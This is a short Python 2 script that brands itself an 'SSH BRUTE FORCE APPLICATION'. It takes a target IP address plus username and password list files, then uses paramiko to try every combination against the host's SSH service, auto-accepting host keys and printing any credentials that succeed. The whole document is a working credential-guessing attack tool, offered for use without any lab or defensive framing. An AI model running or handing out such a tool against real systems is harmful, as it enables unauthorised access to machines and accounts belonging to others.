import paramiko
import time
import sys
import os

print("   -------------------------------------------------------------------------------------------   ")
print("   -------------------------------------------------------------------------------------------   ")
print("   ''                                                                                       ''   ")
print("   ''                         ---------  WELCOME TO THIS  ---------                         ''   ")
print("   ''                                                                                       ''   ")
print("   ''                          - - - - - - - - - - - - - - - - - -                          ''   ")
print("   ''                         '       __ __    __ __              '                         ''   ")
print("   ''                         '     /        /         /     /    '                         ''   ")
print("   ''                         '    /__ __   /__ __    /__ _ /     '                         ''   ")
print("   ''                         '         /        /   /     /      '                         ''   ")
print("   ''                         '   __ __/   __ __/   /     /       '                         ''   ")                
print("   ''                         '                                   '                         ''   ")
print("   ''                         '- - - - - - - - - - - - - - - - - -'                         ''   ")
print("   ''                                                                                       ''   ")
print("   ''                         -----------  BRUTE FORCE  -----------                         ''   ")
print("   ''                                                                                       ''   ")
print("   ''                         -----------  APPLICATION  -----------                         ''   ")
print("   ''                                                                                       ''   ")
print("   -------------------------------------------------------------------------------------------   ")
print("   -------------------------------------------------------------------------------------------   ")
print
print

try:

	print("   -------------------------------------------------------------------------------------------   ")
	ip_address = raw_input('   Which device you want to connect [Its IP address] ?' + '\n' + 
   		   "   -------------------------------------------------------------------------------------------   " + '\n' +                    
	    	               '   Enter the answer: ')

#answer = raw_input('Do you know a username for this device ' + "(" + ip_address + ")" + '?' + '\n' + 'Enter [Y/N]: ')

#if (answer == 'Y') or (answer == 'y'):

#	usernames = raw_input("Enter the username: ")

#else:

 #   answer_file = raw_input("Do you want to load a file for usernames?" + '\n' + 'Enter [Y/N]: ')

  #  if (answer_file == 'Y') or (answer_file == 'y'):

	try:
		print("   -------------------------------------------------------------------------------------------   ")
		file_name_ur = raw_input("   Enter the file name for username: ")
		with open(file_name_ur) as file_ur:
			 usernames = file_ur.read().splitlines()
		print("   -------------------------------------------------------------------------------------------   ")	 
	#print(usernames)
		print
	except:
		print("   -------------------------------------------------------------------------------------------   ")
		print("   Failed to import file!")
		print("   -------------------------------------------------------------------------------------------   ")
		print
		sys.exit()

	try:
		print("   -------------------------------------------------------------------------------------------   ")
		file_name_pw = raw_input("   Enter the file name for passwords: ")
		with open(file_name_pw) as file_pw:
    		 passwords = file_pw.read().splitlines()
    		 #print(passwords)
    	 	 print
	except:
		print("   -------------------------------------------------------------------------------------------   ")
		print("   Failed to import file!")
		print("   -------------------------------------------------------------------------------------------   ")
		print
		sys.exit()

#except:
#	print("   -------------------------------------------------------------------------------------------   ")		
#	print("   Failed to connect, try again.")
#	print("   -------------------------------------------------------------------------------------------   ")
#	print


	for user in usernames:

		for passwd in passwords:

			try:
				ssh_client = paramiko.SSHClient()
				ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
				print("   -------------------------------------------------------------------------------------------   ") 
				print ("   Trying username: " + user + " with " + "password: " + passwd + "\n")
				ssh_client.connect(hostname=ip_address, username=user, password=passwd)
				print("   -------------------------------------------------------------------------------------------   ")			
				print
				print("   Successful connection to" + " " + ip_address + " " + "with username: " + user + " and password: " + passwd + "\n")
				print
				print("   Congratulations ^_^")
				print
				time.sleep(3)
				os._exit(0)

			except:
				print("   -------------------------------------------------------------------------------------------   ")
				print("   Authentication failed!!")
				print
				#print("   -------------------------------------------------------------------------------------------   ")
				print

except:
	print("   -------------------------------------------------------------------------------------------   ")
	print("   Failed to connect, try again.")
	print("   -------------------------------------------------------------------------------------------   ")
	time.sleep(5)
	sys.exit()
